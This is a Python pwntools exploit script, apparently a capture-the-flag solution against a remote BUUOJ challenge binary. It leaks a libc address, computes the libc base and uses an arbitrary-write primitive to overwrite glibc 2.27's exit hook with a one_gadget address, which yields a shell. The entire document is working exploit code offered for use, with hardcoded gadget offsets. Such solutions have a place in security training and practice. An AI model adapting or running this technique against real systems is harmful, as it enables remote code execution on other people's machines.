from pwn import *
#p=process('./1')
#p=process(['./1'],env={'LD_PRELOAD':'./libc-2.27_64.so'})
#libc=ELF('/glibc/2.27/64/lib/libc-2.27.so')
p=remote('node3.buuoj.cn',26442)
libc=ELF('libc-2.27_64.so')
context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])
#context.log_level='debug'
def debug():
    gdb.attach(p)
    pause()
def Pwn(addr,num):
    p.sendlineafter("(q)uit\n","w")
    p.sendlineafter("ptr: ",str(addr))
    p.sendlineafter("val: ",str(num))
p.recvuntil('puts: ')
libc_base=int(p.recv(14),16)-libc.sym['puts']
print hex(libc_base)
#exit_hook=libc_base+0x619f68
exit_hook=libc_base+0x619f68
print hex(exit_hook)
debug()
og=[0x4f2c5,0x4f322,0x10a38c]
ogg=libc_base+og[1]
Pwn(str(exit_hook),str(ogg))
quit()

p.interactive()
